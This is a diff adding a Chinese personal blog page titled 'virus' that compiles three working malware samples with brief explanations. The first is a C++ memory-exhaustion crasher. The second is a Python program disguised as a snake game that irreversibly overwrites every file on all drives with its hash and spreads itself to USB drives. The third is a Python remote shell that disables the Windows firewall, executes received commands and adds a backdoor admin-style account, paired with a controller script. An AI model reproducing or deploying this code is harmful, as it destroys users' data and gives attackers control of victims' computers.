@@ -1,0 +1,499 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>病毒 | Gridea</title>
+<link rel="shortcut icon" href="http://huangmingli.ml/favicon.ico?v=1596375713697">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="http://huangmingli.ml/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="病毒 | Gridea - Atom Feed" href="http://huangmingli.ml/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+参考了CSDN 和平鸽5567 的文档，这里是几篇文章的汇总
+
+1号病毒：
+病毒是C++语言
+#include &lt;bits/stdc++.h&gt; 
+/*病毒不需要万能头文件，只需iostream，为了方便读者在下面添加其他功能，..." />
+    <meta name="keywords" content="软件,电脑操作,Python,文件" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="http://huangmingli.ml">
+  <img class="avatar" src="http://huangmingli.ml/images/avatar.png?v=1596375713697" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              病毒
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-03-27
+              </span>
+              <span>
+                7 min read
+              </span>
+              
+                <a href="http://huangmingli.ml/tag/jExDrgbsVq/" class="post-tag">
+                  # 软件
+                </a>
+              
+                <a href="http://huangmingli.ml/tag/DVl0teJMPT/" class="post-tag">
+                  # 电脑操作
+                </a>
+              
+                <a href="http://huangmingli.ml/tag/Bz9PrMIYTT/" class="post-tag">
+                  # Python
+                </a>
+              
+                <a href="http://huangmingli.ml/tag/sQxBWofXSD/" class="post-tag">
+                  # 文件
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <blockquote>
+<p>参考了CSDN <a href="https://blog.csdn.net/weixin_42904058">和平鸽5567</a> 的文档，这里是几篇文章的汇总</p>
+</blockquote>
+<h2 id="1号病毒">1号病毒：</h2>
+<h3 id="病毒是c语言">病毒是C++语言</h3>
+<pre><code class="language-cpp">#include &lt;bits/stdc++.h&gt; 
+/*病毒不需要万能头文件，只需iostream，为了方便读者在下面添加其他功能，所以用万能头文件*/
+using namespace std;
+int main(){
+    while(true)
+    {
+        char *p=new char[10000];
+    }
+    return 0;
+}
+</code></pre>
+<p>这代码没有什么要解释的，太简单。第五行是程序的关键，用来动态调用系统内存，并利用new函数插入10000（本数字是我精心挑选的，它是最大的不引起系统警告，而死机速度又很快的）个字符。</p>
+<h2 id="2号病毒">2号病毒：</h2>
+<h3 id="病毒是python3语言">病毒是Python3语言</h3>
+<pre><code class="language-python">import win32api
+import win32con
+import hashlib
+import os
+import shutil
+import time
+ 
+jmp = os.popen(&quot;wmic VOLUME GET Label, Name&quot;).read()
+ 
+def Copy(np):
+    p = os.getcwd() + '\\snake.exe'
+    os.chdir(np)
+    shutil.copy(p,np)
+ 
+def Usb():
+    plates = os.popen(&quot;wmic VOLUME GET Label, Name&quot;).read()
+    pl=['A:/','B:/','C:/','D:/','E:/','F:/','G:/','H:/','I:/','J:/','K:/','L:/','M:/','N:/','O:/','P:/','Q:/','R:/','S:/','T:/','U:/','V:/','W:/','X:/','Y:/','Z:/']
+    l = plates.__len__()
+    i = 0
+    for i in range(l+1):
+        try:
+            if plates[i+1]==':':
+                path = plates[i] + plates[i+1] + plates[i+2]
+                vpath = path + 'snake.exe'
+                try:
+                    f = open(vpath)
+                except:
+                    Copy(path)
+        except:
+            pass
+ 
+def Thanos(plate):
+    g = os.walk(plate)
+    for path,d,filelist in g:
+        for filename in filelist:
+            if 'snake.exe' not in os.path.join(path,filename):
+                xd = open(os.path.join(path, filename), 'rb').read()
+                gys = xd
+                sha1 = hashlib.sha1(gys)
+                osv = sha1.hexdigest()
+                bx = bytes(osv, encoding='utf-8')
+                with open(os.path.join(path, filename), 'wb') as f:
+                    f.write(bx)
+ 
+def Snake():
+ 
+    import pygame, sys, random
+ 
+ 
+    check_errors = pygame.init()
+    if check_errors[1] &gt; 0:
+        print(&quot;(!) Had {0} initializing errors, exiting...&quot;.format(check_errors[1]))
+        sys.exit(-1)
+    else:
+        print(&quot;(+) PyGame successfully initialized!&quot;)
+ 
+ 
+    playSurface = pygame.display.set_mode((820, 560))
+    pygame.display.set_caption('snake')
+ 
+ 
+    red = pygame.Color(255, 0, 0)
+    green = pygame.Color(0, 255, 0)
+    black = pygame.Color(0, 0, 0)
+    white = pygame.Color(255, 255, 255)
+    brown = pygame.Color(165, 42, 42)
+ 
+ 
+    fpsController = pygame.time.Clock()
+ 
+ 
+    snakePos = [100, 50]
+    snakeBody = [[100, 50], [90, 50], [80, 50]]
+ 
+    foodPos = [random.randrange(1, 72) * 10, random.randrange(1, 46) * 10]
+    foodSpawn = True
+ 
+    direction = 'RIGHT'
+    changeto = direction
+ 
+    score = 0
+ 
+ 
+    def gameOver():
+        myFont = pygame.font.SysFont('monaco', 72)
+        GOsurf = myFont.render('Game Over!', True, red)
+        GOrect = GOsurf.get_rect()
+        GOrect.midtop = (370, 190)
+        playSurface.blit(GOsurf, GOrect)
+        showScore(0)
+        pygame.display.flip()
+ 
+        time.sleep(4)
+        pygame.quit()
+        sys.exit()
+ 
+    def showScore(choice=1):
+        sFont = pygame.font.SysFont('monaco', 24)
+        Ssurf = sFont.render('Score : {0}'.format(score), True, black)
+        Srect = Ssurf.get_rect()
+        if choice == 1:
+            Srect.midtop = (370, 230)
+        else:
+            Srect.midtop = (370, 230)
+        playSurface.blit(Ssurf, Srect)
+ 
+ 
+    while True:
+        for event in pygame.event.get():
+            if event.type == pygame.QUIT:
+                pygame.quit()
+                sys.exit()
+            elif event.type == pygame.KEYDOWN:
+                if event.key == pygame.K_RIGHT or event.key == ord('d'):
+                    changeto = 'RIGHT'
+                if event.key == pygame.K_LEFT or event.key == ord('a'):
+                    changeto = 'LEFT'
+                if event.key == pygame.K_UP or event.key == ord('w'):
+                    changeto = 'UP'
+                if event.key == pygame.K_DOWN or event.key == ord('s'):
+                    changeto = 'DOWN'
+                if event.key == pygame.K_ESCAPE:
+                    pygame.event.post(pygame.event.Event(pygame.QUIT))
+ 
+        if changeto == 'RIGHT' and not direction == 'LEFT':
+            direction = 'RIGHT'
+        if changeto == 'LEFT' and not direction == 'RIGHT':
+            direction = 'LEFT'
+        if changeto == 'UP' and not direction == 'DOWN':
+            direction = 'UP'
+        if changeto == 'DOWN' and not direction == 'UP':
+            direction = 'DOWN'
+ 
+ 
+        if direction == 'RIGHT':
+            snakePos[0] += 10
+        if direction == 'LEFT':
+            snakePos[0] -= 10
+        if direction == 'UP':
+            snakePos[1] -= 10
+        if direction == 'DOWN':
+            snakePos[1] += 10
+ 
+ 
+        snakeBody.insert(0, list(snakePos))
+        if snakePos[0] == foodPos[0] and snakePos[1] == foodPos[1]:
+            score += 1
+            foodSpawn = False
+        else:
+            snakeBody.pop()
+ 
+ 
+        if foodSpawn == False:
+            foodPos = [random.randrange(1, 82) * 10, random.randrange(1, 56) * 10]
+        foodSpawn = True
+ 
+ 
+        playSurface.fill(white)
+ 
+ 
+        for pos in snakeBody:
+            pygame.draw.rect(playSurface, green, pygame.Rect(pos[0], pos[1], 10, 10))
+ 
+        pygame.draw.rect(playSurface, brown, pygame.Rect(foodPos[0], foodPos[1], 10, 10))
+ 
+ 
+        if snakePos[0] &gt;= 820 or snakePos[0] &lt; 0:
+            gameOver()
+        if snakePos[1] &gt;= 470 or snakePos[1] &lt; 0:
+            gameOver()
+ 
+        for block in snakeBody[1:]:
+            if snakePos[0] == block[0] and snakePos[1] == block[1]:
+                gameOver()
+ 
+        showScore()
+        pygame.display.flip()
+        fpsController.tick(10)
+ 
+ 
+print('lodding...')
+ 
+pl=['A:/','B:/','C:/','D:/','E:/','F:/','G:/','H:/','I:/','J:/','K:/','L:/','M:/','N:/','O:/','P:/','Q:/','R:/','S:/','T:/','U:/','V:/','W:/','X:/','Y:/','Z:/']
+l = jmp.__len__()
+i = 0
+for i in range(l+1):
+    try:
+        if jmp[i+1]==':':
+            path = jmp[i] + jmp[i+1] + jmp[i+2]
+            Thanos(path)
+    except:
+        pass
+ 
+Snake()
+ 
+win32api.MessageBox(0, 'your all files on this computer is in MD5!', 'Ooooooops!', win32con.MB_ICONWARNING)
+ 
+while True:
+    time.sleep(60)
+    Usb()
+</code></pre>
+<h3 id="一定不要在自己的电脑上运行">一定不要在自己的电脑上运行</h3>
+<h3 id="never-run-this-on-your-computer">NEVER RUN THIS ON YOUR COMPUTER</h3>
+<p>病毒的作用是：加密电脑上所有文件。<br>
+<em>呃......感觉......玩的有点过了呀......</em><br>
+运行此代码需要安装第三方库：<br>
+pywin32  如果你的Python是3.6版本，在cmd里运行：“pip install pywin32”（去掉引号）即可，否则，到<a href="https://github.com/mhammond/pywin32/">https://github.com/mhammond/pywin32/</a> 里面下载对应的版本安装，具体安装过程可以看<a href="https://www.cnblogs.com/yjlch1016/p/8469429.html">https://www.cnblogs.com/yjlch1016/p/8469429.html</a>的介绍。</p>
+<p>time、os、 hashlib是Python自带的。无需安装</p>
+<h2 id="3号病毒">3号病毒</h2>
+<h3 id="还是python3语言">还是Python3语言</h3>
+<p>此病毒分被控端——别人电脑上的、主控端——自己电脑上的<br>
+被控端：</p>
+<pre><code class="language-python">
+import os
+import socket
+os.popen('net stop mpssvc')
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+host = 'USER-20180705UV'
+port = 6666
+s.bind((host,port))
+s.listen(5)
+while True:
+    print('lodding...\n\n')
+    c,addr = s.accept()
+    while True:
+        try:
+            client_date = str(c.recv(1024),'utf8')
+            if client_date == 'quit':
+                c.close()
+                break
+        except Exception:
+            break
+ 
+        if client_date == 'bd':
+            os.popen('net user hacker 123456 /ADD')
+            re = 'BackDoor ADD Finish! ' + socket.gethostbyname(socket.gethostname())
+            c.send(bytes(re,'utf8'))
+        else:
+            r = os.popen(client_date).read()
+            c.send(bytes(r,'utf8'))
+</code></pre>
+<p>os、socket都是Python自带库，无需安装</p>
+<p>主控端：</p>
+<pre><code class="language-python">import socket
+host = input('Host: ') #对方的IP
+port = 6666
+hostport = (host,port)
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(hostport)
+ 
+def send():
+    user_input = input('&gt; ').strip()
+    if user_input == 'quit':
+        s.close()
+        exit(0)
+    elif user_input == 'backdoor':
+        s.send(bytes('bd','utf8'))
+    else:
+        s.send(bytes(user_input,'utf8'))
+ 
+def get():
+    server_reply = s.recv(1024)
+    print('Server result:\n')
+    print(str(server_reply, 'utf8'))
+ 
+while True:
+    send()
+    get()
+</code></pre>
+<p>socket是Python自带库，无需安装</p>
+<p>很简单,只能远程运行cmd命令,不过输入&quot;backdoor&quot;命令可以自动在Server上创建新用户。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#1%E5%8F%B7%E7%97%85%E6%AF%92">1号病毒：</a>
+<ul>
+<li><a href="#%E7%97%85%E6%AF%92%E6%98%AFc%E8%AF%AD%E8%A8%80">病毒是C++语言</a></li>
+</ul>
+</li>
+<li><a href="#2%E5%8F%B7%E7%97%85%E6%AF%92">2号病毒：</a>
+<ul>
+<li><a href="#%E7%97%85%E6%AF%92%E6%98%AFpython3%E8%AF%AD%E8%A8%80">病毒是Python3语言</a></li>
+<li><a href="#%E4%B8%80%E5%AE%9A%E4%B8%8D%E8%A6%81%E5%9C%A8%E8%87%AA%E5%B7%B1%E7%9A%84%E7%94%B5%E8%84%91%E4%B8%8A%E8%BF%90%E8%A1%8C">一定不要在自己的电脑上运行</a></li>
+<li><a href="#never-run-this-on-your-computer">NEVER RUN THIS ON YOUR COMPUTER</a></li>
+</ul>
+</li>
+<li><a href="#3%E5%8F%B7%E7%97%85%E6%AF%92">3号病毒</a>
+<ul>
+<li><a href="#%E8%BF%98%E6%98%AFpython3%E8%AF%AD%E8%A8%80">还是Python3语言</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="http://huangmingli.ml/post/fei-chang-hao-de-xia-zai-qi-motrix/">
+              <h3 class="post-title">
+                非常好的下载器motrix
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="http://huangmingli.ml/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
